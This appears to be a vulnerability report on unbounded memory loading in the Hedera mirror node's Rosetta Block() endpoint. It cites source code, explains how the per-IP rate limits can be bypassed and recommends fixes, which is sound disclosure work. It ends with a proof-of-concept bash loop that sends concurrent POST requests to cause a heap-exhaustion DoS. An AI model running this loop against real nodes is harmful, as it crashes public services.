### Title
Unbounded Pre-Cap Memory Load in `Block()` via `FindBetween()` Enables Heap Exhaustion DoS

### Summary
In `rosetta/app/services/block_service.go`, the `Block()` function calls `FindBetween()` to load **all** transactions for a block into heap memory before the `maxTransactionsInBlock` cap is applied. The `FindBetween()` implementation in `rosetta/app/persistence/transaction.go` accumulates every transaction row from the database into a single unbounded slice using a DB-pagination loop (`batchSize=2000`), with no total-count ceiling. An unauthenticated attacker who repeatedly requests a block containing a large number of transactions can exhaust the Go heap on the mirror node, causing OOM crashes.

### Finding Description

**Exact code path:**

`rosetta/app/services/block_service.go`, `Block()`, line 56:
```go
if block.Transactions, err = s.FindBetween(ctx, block.ConsensusStartNanos, block.ConsensusEndNanos); err != nil {
``` [1](#0-0) 

`FindBetween()` is called unconditionally and returns the **complete** transaction set. Only after it returns does the cap check occur at lines 61–66:
```go
if len(block.Transactions) > s.maxTransactionsInBlock {
    ...
    block.Transactions = block.Transactions[0:s.maxTransactionsInBlock]
}
``` [2](#0-1) 

**Root cause in `FindBetween()`:**

`rosetta/app/persistence/transaction.go`, lines 123–147: the function allocates a `transactions` slice and appends every DB batch to it in a loop, with no upper bound on total accumulated rows:
```go
transactions := make([]*transaction, 0)
for start <= end {
    transactionsBatch := make([]*transaction, 0)
    ...Limit(batchSize).Find(&transactionsBatch)...
    transactions = append(transactions, transactionsBatch...)
    if len(transactionsBatch) < batchSize {
        break
    }
    start = transactionsBatch[len(transactionsBatch)-1].ConsensusTimestamp + 1
}
``` [3](#0-2) 

`batchSize = 2000` (line 22) is a **DB fetch page size**, not a memory cap. All pages are accumulated into the same slice. [4](#0-3) 

Each `transaction` struct carries JSON-encoded `CryptoTransfers`, `StakingRewardPayouts`, `ItemizedTransfer`, `Memo`, and `Hash` byte slices — making per-row memory non-trivial. [5](#0-4) 

**Why existing checks fail:**

- `maxTransactionsInBlock` is stored in `config.Response.MaxTransactionsInBlock` and is applied **post-fetch** — it does not prevent `FindBetween()` from loading the full set. [6](#0-5) 

- The Traefik `inFlightReq` (5 per IP) and `rateLimit` (10 req/s per host) middleware in the Helm chart is **conditionally enabled** (`{{ if and .Values.global.middleware .Values.middleware }}`), meaning it is absent in non-Helm or misconfigured deployments. Even when present, it is per-IP and bypassable with multiple source addresses. [7](#0-6) [8](#0-7) 

- There is no application-level rate limiting or per-request transaction count limit inside the Rosetta Go service itself. [9](#0-8) 

### Impact Explanation
An attacker can cause the Go runtime to allocate arbitrarily large heap regions per `/block` request. With concurrent requests targeting a high-transaction block, memory pressure accumulates faster than GC can reclaim it, leading to OOM kills of the Rosetta process. Because the Rosetta API is a public, unauthenticated endpoint, this requires no credentials. Crashing ≥30% of deployed Rosetta mirror-node instances satisfies the stated Medium severity threshold for network processing disruption.

### Likelihood Explanation
The Rosetta `/block` endpoint accepts any valid block identifier with no authentication. Hedera mainnet regularly produces blocks with thousands of transactions during peak load. An attacker needs only to identify such a block (trivially done by querying the public ledger) and issue concurrent POST requests. No brute force, no credentials, no special tooling — only a script sending repeated HTTP POST requests. The attack is repeatable and stateless.

### Recommendation
1. **Apply the cap inside `FindBetween()` or add a `limit` parameter**: pass `maxTransactionsInBlock` into `FindBetween()` and break the accumulation loop once the limit is reached, preventing over-allocation at the source.
2. **Add an application-level in-flight request limiter** (e.g., a Go semaphore or `golang.org/x/time/rate` limiter) inside the Rosetta service, independent of infrastructure middleware.
3. **Do not rely solely on optional Helm/Traefik middleware** for DoS protection of a public endpoint.

### Proof of Concept
```
# 1. Identify a high-transaction block on mainnet (e.g., via Hedera Mirror REST API)
curl https://mainnet-public.mirrornode.hedera.com/api/v1/blocks?limit=1&order=desc

# 2. Extract block index (e.g., 65000000) with many transactions

# 3. Send concurrent /block requests to the Rosetta node
for i in $(seq 1 50); do
  curl -s -X POST http://<rosetta-host>:5700/block \
    -H 'Content-Type: application/json' \
    -d '{
      "network_identifier": {"blockchain":"Hedera","network":"mainnet"},
      "block_identifier": {"index": 65000000}
    }' &
done
wait

# Result: each goroutine in the Rosetta server allocates a full in-memory
# transaction slice for the block before the maxTransactionsInBlock cap is
# applied, exhausting heap and triggering OOM.
```

### Citations

**File:** rosetta/app/services/block_service.go (L56-56)
```go
	if block.Transactions, err = s.FindBetween(ctx, block.ConsensusStartNanos, block.ConsensusEndNanos); err != nil {
```

**File:** rosetta/app/services/block_service.go (L61-66)
```go
	if len(block.Transactions) > s.maxTransactionsInBlock {
		otherTransactions = make([]*rTypes.TransactionIdentifier, 0, len(block.Transactions)-s.maxTransactionsInBlock)
		for _, transaction := range block.Transactions[s.maxTransactionsInBlock:] {
			otherTransactions = append(otherTransactions, &rTypes.TransactionIdentifier{Hash: transaction.Hash})
		}
		block.Transactions = block.Transactions[0:s.maxTransactionsInBlock]
```

**File:** rosetta/app/persistence/transaction.go (L22-22)
```go
	batchSize                                                 = 2000
```

**File:** rosetta/app/persistence/transaction.go (L64-75)
```go
type transaction struct {
	ConsensusTimestamp   int64
	CryptoTransfers      string
	EntityId             *domain.EntityId
	Hash                 []byte
	ItemizedTransfer     domain.ItemizedTransferSlice `gorm:"type:jsonb"`
	Memo                 []byte
	PayerAccountId       domain.EntityId
	Result               int16
	StakingRewardPayouts string
	Type                 int16
}
```

**File:** rosetta/app/persistence/transaction.go (L123-147)
```go
	transactions := make([]*transaction, 0)
	for start <= end {
		transactionsBatch := make([]*transaction, 0)
		err := db.
			Raw(
				selectTransactionsInTimestampRangeOrdered,
				sql.Named("start", start),
				sql.Named("end", end),
			).
			Limit(batchSize).
			Find(&transactionsBatch).
			Error
		if err != nil {
			log.Errorf(databaseErrorFormat, hErrors.ErrDatabaseError.Message, err)
			return nil, hErrors.ErrDatabaseError
		}

		transactions = append(transactions, transactionsBatch...)

		if len(transactionsBatch) < batchSize {
			break
		}

		start = transactionsBatch[len(transactionsBatch)-1].ConsensusTimestamp + 1
	}
```

**File:** rosetta/app/config/types.go (L83-85)
```go
type Response struct {
	MaxTransactionsInBlock int `yaml:"maxTransactionsInBlock"`
}
```

**File:** charts/hedera-mirror-rosetta/templates/middleware.yaml (L3-3)
```yaml
{{ if and .Values.global.middleware .Values.middleware -}}
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L149-166)
```yaml
middleware:
  - circuitBreaker:
      expression: NetworkErrorRatio() > 0.25 || ResponseCodeRatio(500, 600, 0, 600) > 0.25
  - inFlightReq:
      amount: 5
      sourceCriterion:
        ipStrategy:
          depth: 1
  - rateLimit:
      average: 10
      sourceCriterion:
        requestHost: true
  - retry:
      attempts: 3
      initialInterval: 100ms
  - stripPrefix:
      prefixes:
        - "/rosetta"
```

**File:** rosetta/app/middleware/metrics.go (L76-83)
```go
func MetricsMiddleware(next http.Handler) http.Handler {
	return middleware.Instrument{
		Duration:         requestDurationHistogram,
		InflightRequests: requestInflightGauge,
		RequestBodySize:  requestBytesHistogram,
		ResponseBodySize: responseBytesHistogram,
		RouteMatcher:     next.(middleware.RouteMatcher),
	}.Wrap(next)
```
